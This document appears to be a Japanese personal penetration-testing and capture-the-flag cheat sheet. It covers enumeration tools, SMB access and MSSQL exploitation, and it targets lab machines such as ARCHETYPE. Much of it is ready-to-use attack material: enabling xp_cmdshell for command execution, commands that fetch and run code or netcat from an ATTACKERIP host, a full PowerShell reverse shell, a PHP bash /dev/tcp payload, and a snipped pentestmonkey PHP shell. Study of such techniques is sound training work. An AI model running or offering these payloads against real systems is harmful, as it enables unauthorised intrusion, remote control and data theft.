# tips
# 目次
[🔴nmap](#nmap)

[🔴hosts設定](#hosts設定)

[🔴仮想pipinstallが必要な場合](#仮想pipinstallが必要な場合)

[🔴Dockerが必要な場合](#dockerが必要な場合)

[🔴pwntools](#pwntools)

[🔴サブドメイン列挙](#サブドメイン列挙)

[🔴directory列挙](#directory列挙)

[🔴ユーザー列挙](#ユーザー列挙)

[🔴ファイルのパスを検索](#ファイルのパスを検索)

[🔴SSHコマンド](#SSHコマンド)

[🔴SMB](#SMB)

[🔴MSSQL](#MSSQL)

[🔴サーバ](#サーバ)

[🔴Privilege escalation to root](#privilege-escalation-to-root)

[🔴hoge](#)

[🔴hoge](#)

[🔵tools](#tools)

[impacket](#impacket)

[winpeas](#winpeas)

## 🔴nmap

## 🔴hosts設定

## 🔴仮想pipinstallが必要な場合

### 1. directory作成
```
sudo apt update
sudo apt install python3-venv python3-pip -y
mkdir -p ~/venv/tf
```
### 2. 仮想環境を作成（Python3のvenvモジュール使用）
```
python3 -m venv ~/venv/tf
```
### 3. 仮想環境を有効化
```
source ~/venv/tf/bin/activate
```
## 🔴Dockerが必要な場合
```
sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
sudo systemctl enable docker
sudo docker run hello-world
sudo usermod -aG docker $USER
newgrp docker
```
## 🔴pwntools
```
sudo apt install pwntools
or
sudo apt update
sudo apt install -y python3-pip python3-dev libssl-dev libffi-dev build-essential
pip3 install --upgrade pip
pip3 install pwntools
python3 -c "from pwn import *; print('pwntools is installed')"
```
## 🔴サブドメイン列挙
### Sublist3r
```
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
python3 sublist3r.py -d ドメイン -o hoge_subdomains.txt
```

### FFUF
```
ffuf -w -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ドメイン -mc 200 -fs 0
```
## 🔴directory列挙

### dirb
```
dirb http://ドメイン/
```
### FFUF
```
ffuf -u http://ドメイン/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -t 50
```
### gobuster
```
gobuster dir -u http://ドメイン/ -w /usr/share/wordlists/dirb/common.txt
```
### dirsearch
```
dirsearch -u http://ドメイン/ -x 403,404,400  
```
## 🔴ユーザー列挙
```
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -u "http://ドメイン/view.php?username=FUZZ&file=file.pdf" \
     -H "Cookie: PHPSESSID=xxx" \
     -fr "User not found."
```
## 🔴ファイルのパスを検索

### Windows
```
C:\> where /r C:\ user.txt
```
### linux
```
find / -name "user.txt" 2>/dev/null
find / -name root.txt 2>/dev/null
```
## 🔴SSHコマンド
```
ssh user@hoge.com
```
## 🔴SMB

### 列挙
```
crackmapexec smb xxx.xxx.xxx.xxx -u xxxuserxxx -p 'xxx' --users
smbmap -H xxx.xxx.xxx.xxx -u xxxuserxxx -p 'xxx'
```
### 一覧
```
smbclient -L //xxx.xxx.xxx.xxx/IPC -U xxxuserxxx --password=xxx
```
### アクセス 
```
smbclient //xxx.xxx.xxx.xxx/ADMIN$ -U xxxuserxxx --password=xxx
```
### ファイルアップロード
```
put exploit.zip exploit.zip
```
### ファイルダウンロード
```
get file.txt
```
## 🔴MSSQL
### ✅【1】現在のユーザーと権限の確認
```
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1ならsysadmin権限あり
```
### ✅【2】データベース列挙
```
SELECT name FROM master..sysdatabases;
SELECT name FROM sys.databases;
```
### ✅【3】ログインユーザー列挙
```
SELECT name FROM master.sys.sql_logins;
```

### ✅【4】RCEが可能か調べる：xp_cmdshell の有効化
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;  -- 'xp_cmdshell' の行を確認
```
### ✅【5】xp_cmdshell を有効化（許可されていれば）
```
EXEC sp_configure 'xp_cmdshell', 1;
```
RECONFIGURE;

### ✅【6】OSコマンド実行（RCE）
```
EXEC xp_cmdshell 'whoami';
```
### ✅【7】リバースシェル投下例（ネットワークが許せば）
```
-- ①ダウンロード
EXEC xp_cmdshell 'powershell -NoP -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKERIP/shell.ps1'')"';

-- ②certutilでncをダウンロード
EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKERIP/nc.exe C:\Users\sql_svc\nc.exe';

-- 実行
EXEC xp_cmdshell 'C:\Users\sql_svc\nc.exe ATTACKERIP 4444 -e cmd.exe';
```
## 🔴サーバ
### リバースシェル待ち受け
```
nc -lvnp 4444
```
### HTTP サーバ
```
cd ~/www
python3 -m http.server 80
```
### リバースシェル

[reverseshell.php](https://github.com/L4ughingc4t/offsec-cheats/blob/main/reverseshell.php)

#### shell.ps1 
```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKERIP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```
#### payload.php

```
<?php system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:4444 0>&1'"); ?>

#Reverse Shell 
#payload.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/xxx.xxx.xxx.xxx/4444+0>%261'
```

#### php-reverse-shell.php
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you, then
// do not use this tool.
//
<SNIP>

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1'; // CHANGE THIS WITH YOUR IP
$port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
<SNIP>
?>
```
#### shell接続後エラー解消
su: must be run from a terminal

🔹 1. Pythonを使って擬似TTY付きでシェルを生成
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
🔹 2. Bash 経由でのシェル強化（pythonが使えない時）
```
script /dev/null -c bash
```

## 🔴Privilege escalation to root
[Privilege escalation to root](https://github.com/L4ughingc4t/offsec-cheats/blob/main/root%20escalation%20method/Privilege%20Escalation%20Procedure.md)

# 🔵tools

## impacket
ネットワークプロトコル実装ツールキット
```
| プロトコル | 対応ツールの例                                                 |
| --------- | ------------------------------------------------------------- |
| SMB       | `smbclient.py`, `secretsdump.py`, `smbserver.py`, `psexec.py` |
| RPC       | `rpcdump.py`, `atexec.py`, `samrdump.py`, `rpcmap.py`         |
| LDAP      | `addcomputer.py`, `addspn.py`, `findDelegation.py`            |
| Kerberos  | `ticketer.py`, `getTGT.py`, `getST.py`, `getnpusers.py`       |
| MSSQL     | `mssqlclient.py`                                              |
| WMI/DCOM  | `wmiexec.py`, `dcomexec.py`                                   |
| HTTP/NTLM | `ntlmrelayx.py`                                               |
| RDP       | `rdp_check.py`                                                |
| SNMP      | `snmpquery.py`（※別途）                                       |
```
```
#kali
/usr/share/doc/python3-impacket/examples/

#インストールする場合
git clone https://github.com/fortra/impacket.git
sudo python3 setup.py install
```
#### mssqlclient.py
MSSQL サーバ（TCP 1433）へログインして、SQL クエリを実行できるツール
```
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

#### psexec.py
SMB経由でリモートのWindowsホストに管理者権限でコマンド実行
```
python3 psexec.py administrator@{TARGET_IP}
```

## winPEAS
Windows 環境における権限昇格の可能性を自動で調査するためのツール
#### 1. Kaliなどから Windows に winPEAS をアップロード
```
cd /usr/share/peass/winpeas
python3 -m http.server 80  # Kali側
# Windows側で certutil または powershell wget で取得　C:\Users\ユーザー名\とかがアップロード許可されてる

powershell　wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
powershell -Command "Invoke-WebRequest -Uri http://ATTACKERIP/winPEASx64.exe -OutFile winpeas.exe"
```
#### 2. 実行（PowerShellまたはcmd）
```
.\winPEASx64.exe           ← 自動で幅広く調査
.\winPEASx64.exe quiet     ← 非常に静かに実行（出力最小）
.\winPEASx64.exe systeminfo userinfo servicesinfo
```
